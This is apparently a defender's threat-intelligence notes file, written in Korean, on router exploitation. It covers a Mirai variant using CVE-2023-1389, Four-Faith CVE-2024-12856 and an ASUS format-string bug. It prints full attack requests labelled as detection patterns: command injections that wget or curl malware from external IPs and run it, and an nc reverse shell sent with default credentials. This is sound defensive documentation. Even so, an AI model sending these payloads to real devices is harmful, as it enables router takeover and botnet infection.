@@ -1,0 +1,56 @@
+# 새로운 Mirai 변종의 TP-Link 라우터 공격 (2024년 9월~12월)
+# Hail Cock Botnet
+- 취약점: CVE-2023-1389
+- 설명: TP-Link 라우터의 원격 코드 실행 취약점으로, 공격자는 이를 통해 악성 코드를 실행할 수 있습니다.
+- 공격 내용: 새로운 Mirai 변종인 'Hail Cock Botnet'이 이 취약점을 악용하여 TP-Link 라우터를 감염시켰습니다.
+- 영향: 감염된 라우터는 DDoS 공격 등에 사용되었으며, 다양한 시스템 아키텍처(x86, ARM, MIPS)를 대상으로 했습니다. 
+
+- 기존 탐지 패턴 (/cgi-bin/luci) :
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id>`wget+http://45.202.35[.]24/l+-O-|+sh`) HTTP/1.1
+  Host: localhost:80
+  User-Agent: Go-http-client/1.1
+
+- 신규 변종 패턴 (/cgi-bin/cgi_main.cgi) : 
+POST /cgi-bin/cgi_main.cgi HTTP/1.1
+cgiName=time_tzsetup.cgi&time_action=test&ntp=example.com
+
+cgiName=time_tzsetup.cgi&page=/cfg_system_time.htm&id=69&ntp=`rm x86;curl --output x86 http://154.216.17[.]126/x86; chmod 777 *; ./x86 nvr`&ntp1=time.stdtime.gov.tw&ntp2=`rm x86;curl --output x86 http://154.216.17[.]126/x86; chmod 777 *; ./x86 nvr`&isEnabled=0&timeDiff=+9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30
+
+- 관련 기사 : https://www.akamai.com/ko/blog/security-research/digiever-fix-that-iot-thing
+
+---------------------------------------------------------------------------------------------------------
+
+# Four-Faith 라우터 공격
+# CVE-2024-12856
+
+- 설명 : Four-Faith 산업용 Router 취약점으로, 공격자는 기본 자격 증명을 이용해 사실상 인증되지 않은 원격명령 삽입을 수행할 수 있음. 
+- 공격 경로 : 시스템 시간을 수정화는 과정에서 apply_time_year 매개변수에 OS 명령 삽입 가능 공격 
+
+# /apply.cgi 엔드포인트 -> adj_time_year 매개변수 (공격 경로)
+POST /apply.cgi HTTP/1.1
+Host: 192.168.1.1:90
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+Content-Length: 296
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+adj_time_sec=32&change_action=gozila_cgi&adj_time_day=27&adj_time_mon=10&adj_time_hour=11&adj_time_year=%24%28cd+%2Ftmp%2F%3B+mknod+bOY+p%3Bcat+bOY%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.1.206+1270+%3EbOY%3B+rm+bOY%3B%29&adj_time_min=35&submit_button=index&action=Save&submit_type=adjust_sys_time
+
+- 관련 기사 : https://vulncheck.com/blog/four-faith-cve-2024-12856
+
+---------------------------------------------------------------------------------------------------------
+
+# ASUS Router (ASUS RT-AX56U V2) 
+# CVE-2023-39238 
+
+- 설명 : ASUS-RT-AX56U V2에서 발견된 형식 문자열(format string) 취약점으로, 입력값 검증 부족으로 인해 원격 공격자가 코드를 실행하거나 서비스를 방해할 수 있음.
+
+- 공격 : 이 취약점은 set_iperf3_svr.cgi 모듈 내 특정 값에 대한 검증이 부적절하게 수행되는 데서 발생, 공격자는 set_iperf3_svr.cgi에서 데이터를 전송하여 취약점을 악용합니다.
+
+- 예시 공격 과정 (set_iperf3_svr.cgi)
+r = session.post(f"{host}/set_iperf3_svr.cgi", data=body) --> code
+POST {host}/set_iperf3_svr.cgi HTTP/1.1
+
+
+- 관련 기사 : https://www.clouddefense.ai/cve/2023/CVE-2023-39238
+- 관련 poc : https://github.com/ShielderSec/poc/tree/main/CVE-2023-39238
